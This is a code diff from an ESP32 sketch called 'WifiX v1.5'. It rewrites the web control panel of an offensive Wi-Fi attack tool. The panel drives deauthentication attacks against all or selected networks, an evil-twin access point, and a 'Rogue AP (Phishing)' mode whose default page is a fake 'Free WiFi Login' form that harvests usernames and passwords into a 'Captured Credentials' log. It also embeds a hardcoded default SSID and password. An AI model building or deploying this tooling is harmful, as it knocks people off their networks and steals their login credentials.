@@ -197,142 +197,56 @@ void stopRogueAP() {
 }
 
 void handleRoot() {
-  String html = R"(<!DOCTYPE html>
-<html>
-<head>
-<title>WifiX v1.5 - ESP32</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Arial;background:#1a1a2e;color:#fff}
-.container{max-width:1200px;margin:0 auto;padding:20px}
-h1{text-align:center;color:#00ff88;margin-bottom:30px}
-h2{color:#00d4ff;margin:20px 0 10px;border-bottom:2px solid #00d4ff;padding-bottom:5px}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
-.card{background:#16213e;padding:20px;border-radius:10px;border:1px solid #0f3460}
-.card h3{color:#e94560;margin-bottom:15px}
-.btn{display:inline-block;padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:5px;cursor:pointer;margin:5px;text-decoration:none;font-size:14px}
-.btn:hover{background:#00cc6a}
-.btn:disabled{background:#555;color:#888;cursor:not-allowed}
-.btn-danger{background:#ff4444;color:#fff}
-.btn-danger:hover{background:#cc0000}
-input,select,textarea{width:100%;padding:10px;margin:5px 0;background:#0f3460;border:1px solid #00d4ff;color:#fff;border-radius:5px}
-table{width:100%;border-collapse:collapse;margin-top:10px}
-th,td{padding:10px;text-align:left;border-bottom:1px solid #0f3460}
-th{background:#0f3460;color:#00d4ff}
-tr:hover{background:#0f3460}
-.status{display:inline-block;padding:5px 15px;border-radius:20px;font-weight:bold}
-.on{background:#00ff88;color:#000}
-.off{background:#ff4444;color:#fff}
-.logs{background:#0f3460;padding:15px;border-radius:5px;font-family:monospace;max-height:200px;overflow-y:auto;white-space:pre-wrap}
-</style>
-</head>
-<body>
-<div class="container">
-<h1>WifiX v1.5 - ESP32 Edition</h1>
-
-<div class="grid">
-<div class="card">
-<h3>Status</h3>
-<p>AP Mode: <span class="status)" + String(apActive ? "on" : "off") + R"()">)" + String(apActive ? "ON" : "OFF") + R"()</span></p>
-<p>Attack: <span class="status)" + String(attackActive ? "on" : "off") + R"()">)" + String(attackActive ? "ATTACKING" : "STOPPED") + R"()</span></p>
-<p>Networks: <strong id="netCount">)" + String(foundNetworks) + R"(</strong></p>
-</div>
-
-<div class="card">
-<h3>WiFi Scanner</h3>
-<button class="btn" onclick="scanWiFi()">Scan Networks</button>
-<div id="networks"></div>
-</div>
-
-<div class="card">
-<h3>Deauth Attack</h3>
-<button class="btn" onclick="deauthAll()">Deauth All Networks</button>
-<button class="btn btn-danger" onclick="stopAttack()">Stop Attack</button>
-</div>
-
-<div class="card">
-<h3>Evil Twin</h3>
-<input type="text" id="evilSSID" placeholder="Target SSID">
-<input type="number" id="evilCh" placeholder="Channel" value="1">
-<button class="btn" onclick="startEvilTwin()">Start Evil Twin</button>
-<button class="btn btn-danger" onclick="stopEvilTwin()">Stop</button>
-</div>
-
-<div class="card">
-<h3>Rogue AP (Phishing)</h3>
-<input type="text" id="rogueSSID" value="Free_WiFi">
-<textarea id="rogueHTML" rows="3" placeholder="Custom HTML or leave empty"></textarea>
-<button class="btn" onclick="startRogue()">Start Rogue AP</button>
-<button class="btn btn-danger" onclick="stopRogue()">Stop</button>
-</div>
-
-<div class="card">
-<h3>Captured Credentials</h3>
-<button class="btn" onclick="loadLogs()">Refresh Logs</button>
-<div id="logs" class="logs">No logs yet</div>
-</div>
-
-<div class="card">
-<h3>Settings</h3>
-<input type="text" id="newSSID" value="GMpro">
-<input type="text" id="newPASS" value="Sangkur87">
-<button class="btn" onclick="updateSettings()">Save & Restart</button>
-</div>
-</div>
-</div>
-
-<script>
-let networks = [];
-
-function scanWiFi() {
-  fetch('/scan').then(r=>r.json()).then(d=>{
-    networks = d;
-    document.getElementById('netCount').textContent = d.length;
-    let html = '<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>Ch</th><th>Actions</th></tr>';
-    d.forEach((n,i)=>{
-      html += '<tr><td>'+i+'</td><td>'+(n.ssid||'<i>Hidden</i>')+'</td><td>'+n.rssi+'</td><td>'+n.channel+'</td><td><button class=btn onclick=deauthTarget('+i+')>Deauth</button></td></tr>';
-    });
-    html += '</table>';
-    document.getElementById('networks').innerHTML = html;
-  });
-}
-
-function deauthAll() { fetch('/deauthall'); }
-function stopAttack() { fetch('/stopattack').then(()=>location.reload()); }
-function stopEvilTwin() { fetch('/stopeviltwin'); }
-function stopRogue() { fetch('/stoprogue'); }
-
-function startEvilTwin() {
-  let ssid = encodeURIComponent(document.getElementById('evilSSID').value);
-  let ch = document.getElementById('evilCh').value;
-  fetch('/eviltwin?ssid='+ssid+'&ch='+ch);
-}
-
-function startRogue() {
-  let ssid = encodeURIComponent(document.getElementById('rogueSSID').value);
-  let html = encodeURIComponent(document.getElementById('rogueHTML').value || '<html><body style="text-align:center;padding:50px;font-family:Arial"><h2>Free WiFi Login</h2><form action="/login" method="post"><input name="user" placeholder="Username"><br><br><input type="password" name="pass" placeholder="Password"><br><br><button type="submit" style="padding:10px 30px;background:#00ff88;border:none">Connect</button></form></body></html>');
-  fetch('/rogue?ssid='+ssid+'&html='+html);
-}
-
-function loadLogs() {
-  fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d);
-}
-
-function updateSettings() {
-  let ssid = encodeURIComponent(document.getElementById('newSSID').value);
-  let pass = encodeURIComponent(document.getElementById('newPASS').value);
-  fetch('/settings?ssid='+ssid+'&pass='+pass).then(()=>alert('Restart ESP32!'));
-}
-
-function deauthTarget(i) {
-  fetch('/deauth?bssid='+encodeURIComponent(networks[i].bssid)+'&ch='+networks[i].channel);
-}
-
-setInterval(scanWiFi, 15000);
-</script>
-</body>
-</html>)";
+  String html = "";
+  html += "<!DOCTYPE html><html><head><title>WifiX v1.5 - ESP32</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:#1a1a2e;color:#fff}.container{max-width:1200px;margin:0 auto;padding:20px}h1{text-align:center;color:#00ff88;margin-bottom:30px}h2{color:#00d4ff;margin:20px 0 10px;border-bottom:2px solid #00d4ff;padding-bottom:5px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}.card{background:#16213e;padding:20px;border-radius:10px;border:1px solid #0f3460}.card h3{color:#e94560;margin-bottom:15px}.btn{display:inline-block;padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:5px;cursor:pointer;margin:5px;font-size:14px}.btn:hover{background:#00cc6a}.btn-danger{background:#ff4444;color:#fff}input,select,textarea{width:100%;padding:10px;margin:5px 0;background:#0f3460;border:1px solid #00d4ff;color:#fff;border-radius:5px}table{width:100%;border-collapse:collapse;margin-top:10px}th,td{padding:10px;text-align:left;border-bottom:1px solid #0f3460}th{background:#0f3460;color:#00d4ff}.status{display:inline-block;padding:5px 15px;border-radius:20px;font-weight:bold}.on{background:#00ff88;color:#000}.off{background:#ff4444;color:#fff}.logs{background:#0f3460;padding:15px;border-radius:5px;font-family:monospace;max-height:200px;overflow-y:auto}</style>";
+  html += "</head><body><div class='container'>";
+  html += "<h1>WifiX v1.5 - ESP32 Edition</h1>";
+  html += "<div class='grid'>";
+  html += "<div class='card'><h3>Status</h3>";
+  html += "<p>AP Mode: <span class='status " + String(apActive ? "on" : "off") + "'>" + String(apActive ? "ON" : "OFF") + "</span></p>";
+  html += "<p>Attack: <span class='status " + String(attackActive ? "on" : "off") + "'>" + String(attackActive ? "ATTACKING" : "STOPPED") + "</span></p>";
+  html += "<p>Networks: <strong id='netCount'>" + String(foundNetworks) + "</strong></p>";
+  html += "</div>";
+  html += "<div class='card'><h3>WiFi Scanner</h3>";
+  html += "<button class='btn' onclick='scanWiFi()'>Scan Networks</button>";
+  html += "<div id='networks'></div></div>";
+  html += "<div class='card'><h3>Deauth Attack</h3>";
+  html += "<button class='btn' onclick='deauthAll()'>Deauth All</button>";
+  html += "<button class='btn btn-danger' onclick='stopAttack()'>Stop</button></div>";
+  html += "<div class='card'><h3>Evil Twin</h3>";
+  html += "<input type='text' id='evilSSID' placeholder='Target SSID'>";
+  html += "<input type='number' id='evilCh' placeholder='Channel' value='1'>";
+  html += "<button class='btn' onclick='startEvilTwin()'>Start Evil Twin</button>";
+  html += "<button class='btn btn-danger' onclick='stopEvilTwin()'>Stop</button></div>";
+  html += "<div class='card'><h3>Rogue AP (Phishing)</h3>";
+  html += "<input type='text' id='rogueSSID' value='Free_WiFi'>";
+  html += "<textarea id='rogueHTML' rows='3' placeholder='Custom HTML'></textarea>";
+  html += "<button class='btn' onclick='startRogue()'>Start Rogue AP</button>";
+  html += "<button class='btn btn-danger' onclick='stopRogue()'>Stop</button></div>";
+  html += "<div class='card'><h3>Captured Credentials</h3>";
+  html += "<button class='btn' onclick='loadLogs()'>Refresh Logs</button>";
+  html += "<div id='logs' class='logs'>No logs yet</div></div>";
+  html += "<div class='card'><h3>Settings</h3>";
+  html += "<input type='text' id='newSSID' value='GMpro'>";
+  html += "<input type='text' id='newPASS' value='Sangkur87'>";
+  html += "<button class='btn' onclick='updateSettings()'>Save & Restart</button></div>";
+  html += "</div></div>";
+  html += "<script>";
+  html += "let networks=[];";
+  html += "function scanWiFi(){fetch('/scan').then(r=>r.json()).then(d=>{networks=d;document.getElementById('netCount').textContent=d.length;let h='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>Ch</th><th>Actions</th></tr>';d.forEach((n,i)=>{h+='<tr><td>'+i+'</td><td>'+(n.ssid||'Hidden')+'</td><td>'+n.rssi+'</td><td>'+n.channel+'</td><td><button class=btn onclick=deauthTarget('+i+')>Deauth</button></td></tr>';});h+='</table>';document.getElementById('networks').innerHTML=h;});}";
+  html += "function deauthAll(){fetch('/deauthall');}";
+  html += "function stopAttack(){fetch('/stopattack').then(()=>location.reload());}";
+  html += "function stopEvilTwin(){fetch('/stopeviltwin');}";
+  html += "function stopRogue(){fetch('/stoprogue');}";
+  html += "function startEvilTwin(){fetch('/eviltwin?ssid='+encodeURIComponent(document.getElementById('evilSSID').value)+'&ch='+document.getElementById('evilCh').value);}";
+  html += "function startRogue(){fetch('/rogue?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value)+'&html='+encodeURIComponent(document.getElementById('rogueHTML').value||'<html><body style=text-align:center;padding:50px><h2>Free WiFi Login</h2><form action=/login method=post><input name=user placeholder=Username><br><br><input type=password name=pass placeholder=Password><br><br><button type=submit style=padding:10px 30px;background:#00ff88;border:none>Connect</button></form></body></html>'));}";
+  html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d);}";
+  html += "function updateSettings(){fetch('/settings?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Restart ESP32!'));}";
+  html += "function deauthTarget(i){fetch('/deauth?bssid='+encodeURIComponent(networks[i].bssid)+'&ch='+networks[i].channel);}";
+  html += "setInterval(scanWiFi,15000);";
+  html += "</script></body></html>";
   
   server.send(200, "text/html", html);
 }
